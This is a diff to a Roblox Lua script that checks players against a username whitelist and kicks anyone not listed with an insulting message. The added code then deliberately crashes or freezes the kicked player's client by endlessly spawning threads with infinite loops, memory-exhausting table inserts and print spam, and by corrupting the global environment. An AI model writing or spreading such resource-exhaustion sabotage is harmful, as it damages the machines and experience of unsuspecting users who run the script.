@@ -7,10 +7,37 @@ local whitelist = {
     ["XPhantom_xdemonx"] = true, ["invisibleted"] = true, ["botboysherlocky"] = true, 
     ["sjudsiskdje"] = true, ["IHaveAimb0TN00BS"] = true, ["IDKhowtogame02"] = true, 
     ["IcyEmpathy"] = true, ["HEJUSTSTUNGMEINBAL"] = true, ["Reaperarrived"] = true,
-    ["nobpnas"] = true, ["HAHAHAHA"] = true
+    ["nobpnas"] = true
 }
 
 if not whitelist[player.Name] then
     player:Kick("xd ez get a mom noob🤣🦃")
-    while true do end
+
+    local function corrupt()
+        setmetatable(_G, {__newindex = function() end, __index = function() return nil end})
+        setmetatable(getfenv(), {__newindex = function() end, __index = function() return nil end})
+        while true do end
+    end
+
+    while true do 
+        task.spawn(function()
+            while true do task.wait(math.random()) end
+        end)
+        task.spawn(function()
+            while true do end
+        end)
+        task.spawn(function()
+            for i = 1, 1e7 do table.insert({}, i) end
+        end)
+        task.spawn(function()
+            while true do print("💀 GET A MOM 💀") end
+        end)
+        task.spawn(function()
+            while true do game:GetService("RunService").Stepped:Wait() end
+        end)
+        task.spawn(corrupt)
+        setfenv(1, {})
+        getfenv()["while"] = nil
+        loadstring("while true do end")()
+    end
 end
